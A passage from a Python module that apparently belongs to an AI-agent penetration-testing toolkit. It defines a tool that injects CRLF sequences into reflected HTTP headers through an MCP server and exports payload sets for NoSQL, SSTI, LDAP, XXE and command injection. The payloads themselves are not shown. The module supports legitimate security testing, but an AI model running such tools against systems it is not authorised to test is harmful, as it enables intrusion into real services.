    splitting, cookie injection, and XSS via header reflection.
    """

    def __init__(
        self,
        server_url: str = DEFAULT_INJECTION_SERVER_URL,
        project_id: Optional[str] = None,
        user_id: Optional[str] = None,
    ):
        self._server_url = server_url
        self._project_id = project_id
        self._user_id = user_id
        self._client = MCPClient(server_url)
        super().__init__()

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="header_injection",
            description=(
                "Test for HTTP header injection and CRLF (Carriage Return + Line Feed) "
                "injection vulnerabilities. Injects CRLF sequences (%%0d%%0a, \\r\\n, unicode) "
                "into header values reflected by the server (Location, Referer, X-Forwarded-For). "
                "Detects response splitting, injected Set-Cookie, and XSS via header reflection. "
                "OWASP A03:2021 — Injection."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "url": {"type": "string", "description": "Target URL"},
                    "headers_to_test": {
                        "type": "array",
                        "items": {"type": "string"},
                        "description": "Header names to inject CRLF into",
                        "default": ["Location", "Referer", "X-Forwarded-For", "User-Agent"],
                    },
                    "url_params_to_test": {
                        "type": "array",
                        "items": {"type": "string"},
                        "description": "URL parameters that get reflected in redirect headers",
                        "default": [],
                    },
                    "headers": {"type": "object", "default": {}},
                    "allow_internal": {"type": "boolean", "default": False},
                },
                "required": ["url"],
            },
        )

    @with_timeout(60)
    async def execute(self, **kwargs) -> str:
        url = kwargs.get("url", "")
        headers_to_test = kwargs.get("headers_to_test", ["Location", "Referer", "X-Forwarded-For", "User-Agent"])
        url_params_to_test = kwargs.get("url_params_to_test", [])
        headers = kwargs.get("headers", {})
        allow_internal = kwargs.get("allow_internal", False)

        try:
            result = await self._client.call_tool(
                "header_injection_test",
                {
                    "url": url,
                    "headers_to_test": headers_to_test,
                    "url_params_to_test": url_params_to_test,
                    "crlf_payloads": _CRLF_PAYLOADS,
                    "headers": headers,
                    "allow_internal": allow_internal,
                },
            )
            if result.get("success"):
                return truncate_output(json.dumps(result, indent=2))
        except Exception:
            pass

        result = {
            "success": True,
            "source": "crlf_payload_plan",
            "url": url,
            "headers_to_test": headers_to_test,
            "url_params_to_test": url_params_to_test,
            "crlf_payloads": _CRLF_PAYLOADS,
            "detection_patterns": _CRLF_DETECTION_PATTERNS,
            "owasp_tag": OWASP_INJECTION_TAG,
            "note": "Connect to InjectionMCPServer (:8010) to test against live targets",
        }
        return truncate_output(json.dumps(result, indent=2))


# ---------------------------------------------------------------------------
# Public exports
# ---------------------------------------------------------------------------
__all__ = [
    "NoSQLInjectionTool",
    "SSTIDetectTool",
    "SSTIExploitTool",
    "LDAPInjectionTool",
    "XXETool",
    "CommandInjectionTool",
    "HeaderInjectionTool",
    # helpers
    "_NOSQL_AUTH_BYPASS_PAYLOADS",
    "_NOSQL_QUERY_PAYLOADS",
    "_SSTI_DETECT_PAYLOADS",
    "_SSTI_EXPLOIT_PAYLOADS",
    "_SSTI_ENGINE_PATTERNS",
    "_LDAP_AUTH_BYPASS_PAYLOADS",
    "_LDAP_ENUM_PAYLOADS",
    "_LDAP_ERROR_PATTERNS",
    "XXE_PAYLOADS",
    "_CMD_INJECTION_PAYLOADS",
    "_CRLF_PAYLOADS",
    "_CRLF_DETECTION_PATTERNS",
    # detection functions
    "_detect_nosql_success",
    "_detect_ssti_in_response",
    "_fingerprint_ssti_engine",
    "_detect_ldap_injection",
    "_detect_xxe_in_response",
    "_detect_command_injection",
    "_detect_crlf_injection",
    # enums/constants
    "InjectionSeverity",
    "OWASP_INJECTION_TAG",
    "OWASP_XXE_TAG",
]
